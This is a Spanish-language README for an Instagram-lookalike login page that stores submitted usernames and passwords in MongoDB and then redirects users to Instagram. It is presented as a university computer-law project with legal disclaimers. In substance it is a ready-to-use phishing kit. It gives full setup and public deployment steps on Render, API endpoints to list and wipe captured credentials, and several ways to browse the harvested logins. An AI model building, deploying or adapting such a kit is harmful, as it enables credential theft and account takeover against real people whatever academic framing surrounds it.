# Plantilla de Inicio de Sesión de Instagram - Caso de Estudio

⚠️ **ADVERTENCIA LEGAL**: Este proyecto es únicamente para fines educativos y académicos como parte de un trabajo de Derecho Informático. NO está desplegado y NO debe ser utilizado con fines maliciosos o ilegales.

## Descripción

Plantilla educativa de inicio de sesión de Instagram que demuestra técnicas de ingeniería social con propósitos de análisis de ciberseguridad. El proyecto incluye:

- Interfaz de login que replica el diseño de Instagram
- Sistema de captura de credenciales guardadas en MongoDB
- Redirección automática a Instagram tras el envío del formulario
- **Exclusivamente para estudio académico sobre phishing y ciberseguridad**

## Características Técnicas

- React + Vite
- Tailwind CSS para el diseño
- Backend Node.js + Express
- MongoDB para almacenamiento de credenciales
- Redirección automática a Instagram

## Requisitos

- Node.js (v14 o superior)
- npm o yarn
- Cuenta de MongoDB Atlas (gratis) o MongoDB local

## Configuración de MongoDB Atlas (Gratis)

1. Ve a [MongoDB Atlas](https://www.mongodb.com/cloud/atlas)
2. Crea una cuenta gratuita
3. Crea un nuevo cluster (selecciona el tier gratuito)
4. En "Database Access", crea un usuario con contraseña
5. En "Network Access", agrega tu IP (o 0.0.0.0/0 para acceso desde cualquier lugar)
6. Haz clic en "Connect" > "Connect your application"
7. Copia el connection string

## Instalación

1. Clonar el repositorio
```bash
git clone https://github.com/LuisFelipeCanal/PC1_Derecho_Inform-tic-hfgh.git
cd PC1_Derecho_Inform-tic-hfgh
```

2. Instalar dependencias:
```bash
npm install
```

3. Crear archivo `.env` en la raíz del proyecto:
```bash
cp .env.example .env
```

4. Editar `.env` y agregar tu connection string de MongoDB:
```
MONGODB_URI=mongodb+srv://<usuario>:<contraseña>@cluster.mongodb.net/instagram-phishing-study?retryWrites=true&w=majority
PORT=3001
```

## Uso (Solo para Entorno de Desarrollo Local)

Para ejecutar el proyecto necesitas DOS terminales abiertas:

### Terminal 1 - Servidor Backend
```bash
npm run server
```
El servidor correrá en `http://localhost:3001`

### Terminal 2 - Aplicación Frontend
```bash
npm run dev
```
La aplicación correrá en `http://localhost:5173`

## Funcionamiento

1. El usuario ingresa credenciales en el formulario
2. Las credenciales se guardan en MongoDB con timestamp
3. El usuario es redirigido automáticamente a Instagram
4. Las credenciales quedan almacenadas en la base de datos

## Endpoints del API

- `POST /api/save-credentials` - Guarda las credenciales
- `GET /api/credentials` - Obtiene todas las credenciales guardadas
- `DELETE /api/credentials` - Elimina todas las credenciales

## Despliegue en Render (Gratis)

### Paso 1: Preparar MongoDB Atlas
Ya debes tener tu connection string de MongoDB Atlas configurado.

### Paso 2: Desplegar Backend en Render

1. Ve a [Render](https://render.com) y crea una cuenta
2. Haz clic en "New +" > "Web Service"
3. Conecta tu repositorio de GitHub
4. Configura:
   - **Name**: `instagram-phishing-study-api` (o el nombre que prefieras)
   - **Environment**: Node
   - **Build Command**: `npm install`
   - **Start Command**: `npm run server`
5. En "Environment Variables" agrega:
   - `MONGODB_URI`: Tu connection string de MongoDB Atlas
   - `PORT`: 3001 (opcional, Render asigna automáticamente)
6. Haz clic en "Create Web Service"
7. Copia la URL de tu API (ej: `https://tu-app.onrender.com`)

### Paso 3: Desplegar Frontend en Render

1. En Render, haz clic en "New +" > "Static Site"
2. Conecta tu repositorio de GitHub
3. Configura:
   - **Name**: `instagram-phishing-study-frontend`
   - **Build Command**: `npm install && npm run build`
   - **Publish Directory**: `dist`
4. En "Environment Variables" agrega:
   - `VITE_API_URL`: La URL de tu backend (ej: `https://tu-app.onrender.com`)
5. Haz clic en "Create Static Site"

### Paso 4: Actualizar el código para usar la variable de entorno

Edita `src/components/InstagramLogin.jsx` y cambia:
```javascript
await fetch('http://localhost:3001/api/save-credentials', {
```
Por:
```javascript
await fetch(`${import.meta.env.VITE_API_URL || 'http://localhost:3001'}/api/save-credentials`, {
```

## Visualizar Credenciales Capturadas

Para ver las credenciales guardadas en MongoDB:

### Opción 1: Usar MongoDB Compass (GUI)
1. Descarga [MongoDB Compass](https://www.mongodb.com/products/compass)
2. Conecta usando tu connection string
3. Navega a tu database > collection "credentials"

### Opción 2: API Endpoint
Visita en tu navegador:
```
http://localhost:3001/api/credentials
```
O en producción:
```
https://tu-app.onrender.com/api/credentials
```

### Opción 3: MongoDB Atlas Dashboard
1. Ve a tu cluster en MongoDB Atlas
2. Haz clic en "Browse Collections"
3. Busca la collection "credentials"

## Propósito Educativo

Este proyecto fue desarrollado como material de estudio para:
- Análisis de técnicas de phishing
- Comprensión de ingeniería social
- Educación sobre ciberseguridad
- Trabajo práctico de Derecho Informático

## Consideraciones Éticas y Legales

- ❌ NO usar para capturar credenciales reales
- ❌ NO usar con fines maliciosos
- ❌ NO engañar a personas reales
- ✅ Solo para análisis académico en entorno controlado
- ✅ Solo para educación sobre ciberseguridad
- ✅ Mantener las credenciales de prueba seguras

## Responsabilidad

El uso indebido de este código es responsabilidad única del usuario. Este proyecto se proporciona "tal cual" únicamente con fines educativos.

## Seguridad

- El archivo `.env` está en `.gitignore` para no exponer credenciales
- Las credenciales de MongoDB no deben compartirse públicamente
- Se recomienda usar contraseñas fuertes para MongoDB
- Después de completar el estudio, eliminar las credenciales de prueba

---

**Proyecto Académico - Derecho Informático**
